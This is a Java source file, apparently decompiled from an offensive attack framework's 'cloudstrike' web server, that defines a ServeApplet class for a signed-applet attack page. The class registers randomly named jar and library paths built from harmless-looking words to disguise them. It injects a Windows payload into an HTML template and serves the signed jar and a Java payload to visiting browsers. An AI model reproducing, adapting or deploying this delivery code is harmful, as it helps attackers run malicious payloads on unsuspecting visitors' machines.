package cloudstrike;

import java.io.ByteArrayInputStream;
import java.util.LinkedList;
import java.util.List;
import java.util.Properties;
import java.util.Random;
import profiler.SystemProfiler;

public class ServeApplet implements WebService {
   protected String applet_uri;
   protected String applet_clazz = null;
   protected String jar_uri;
   protected String lib_uri;
   protected String title;
   protected byte[] signed_jar;
   protected String win_payload;
   protected byte[] java_payload;

   public ServeApplet(byte[] signed_jar, String win_payload, byte[] java_payload, String title) {
      this.signed_jar = signed_jar;
      this.win_payload = win_payload;
      this.java_payload = java_payload;
      this.title = title;
   }

   public ServeApplet(byte[] signed_jar, String win_payload, byte[] java_payload, String title, String clazz) {
      this.signed_jar = signed_jar;
      this.win_payload = win_payload;
      this.java_payload = java_payload;
      this.title = title;
      this.applet_clazz = clazz;
   }

   public void setup(WebServer w, String uri) {
      if (this.applet_clazz != null) {
         this.setup(w, uri, this.applet_clazz);
      } else {
         throw new RuntimeException("Missing clazz in ServeApplet setup");
      }
   }

   public void setup(WebServer w, String applet_uri, String applet_clazz) {
      String alpha = "abcdefghijklmnopqrstuvwxyz1234567890_";
      Random r = new Random();
      int aa = Math.abs(r.nextInt());
      int bb = Math.abs(r.nextInt());
      int cc = Math.abs(r.nextInt());
      int dd = Math.abs(r.nextInt());
      String[] begin = new String[]{"applet", "loader", "data", "animation", "chat", "effect", "ticker", "viewer", "toolkit", "gui", "graphics", "support", "supplemental", "optional", "analytics", "live", "user", "profile", "browser", "connection", "crypto", "math", "auxiliary", "aux", "server", "cookie", "libs", "library", "open", "demo", "example", "simple", "game", "manager", "container", "fonts", "images", "content", "native", "canvas", "extra", "session", "web", "tk", "lib", "license", "util", "utils", "choose", "selector", "begin", "office", "documents", "theme", "store", "processor", "merchant", "plugin", "program", "registry", "register", "reputation", "scanner", "source", "enhancements", "macro", "essential", "content", "ml", "markup", "meta", "archive", "report", "info", "help", "helper", "guide", "api", "basic", "interpreter", "scroll", "pipe", "graph", "calculator", "component", "service", "test", "reader", "touch", "gestures", "converter", "list", "advanced", "mobile", "tablet", "os", "cross_platform", "platform", "power", "schedule", "calendar", "secure", "safe", "lock", "key", "cipher", "suite", "highlight", "manual", "automatic", "robot", "require", "internal", "external", "case", alpha.charAt(aa % alpha.length()) + alpha.charAt(bb % alpha.length()) + alpha.charAt(cc % alpha.length()) + alpha.charAt(dd % alpha.length()) + "", "digest", "bean", "ui", "system", "win", "tooltip"};
      this.jar_uri = begin[aa % begin.length] + alpha.charAt(bb % alpha.length()) + alpha.charAt(cc % alpha.length()) + ".jar";
      this.lib_uri = begin[dd % begin.length];
      w.register(applet_uri, this);
      if (applet_uri.endsWith("/")) {
         w.registerSecondary(applet_uri + this.lib_uri, this);
         w.registerSecondary(applet_uri + this.jar_uri, this);
         WebServer.print_info("Registered: " + applet_uri + "libs.jar - it ends with /");
      } else if (applet_uri.lastIndexOf("/") == -1) {
         w.registerSecondary("/" + this.lib_uri, this);
         w.registerSecondary("/" + this.jar_uri, this);
         WebServer.print_info("Registered: /libs.jar - no / in URI");
      } else {
         String parent = applet_uri.substring(0, applet_uri.lastIndexOf("/") + 1);
         w.registerSecondary(parent + this.lib_uri, this);
         w.registerSecondary(parent + this.jar_uri, this);
         WebServer.print_info("Registered: " + parent + "libs.jar");
      }

      this.applet_clazz = applet_clazz;
      this.applet_uri = applet_uri;
   }

   public boolean suppressEvent(String uri) {
      return false;
   }

   public String resource(String resource) {
      StringBuffer temp = new StringBuffer(524288);

      try {
         SystemProfiler.suckItDown(resource, temp);
      } catch (Exception var4) {
         WebServer.logException("Could not get: " + resource, var4, false);
      }

      return temp.toString().replace("%JAR_URI%", this.jar_uri).replace("%DATA%", this.win_payload).replace("%CLASS%", this.applet_clazz).replace("%LIB_URI%", this.lib_uri);
   }

   public Response serve(String uri, String method, Properties header, Properties param) {
      if (uri.endsWith(this.jar_uri)) {
         return new Response("200 OK", "application/java-archive", new ByteArrayInputStream(this.signed_jar));
      } else {
         return uri.endsWith(this.lib_uri) ? new Response("200 OK", "application/java-archive", new ByteArrayInputStream(this.java_payload)) : new Response("200 OK", "text/html", this.resource("/resources/applet.html"));
      }
   }

   public String toString() {
      return this.title;
   }

   public String getType() {
      return "page";
   }

   public List cleanupJobs() {
      return new LinkedList();
   }

   public boolean isFuzzy() {
      return false;
   }
}
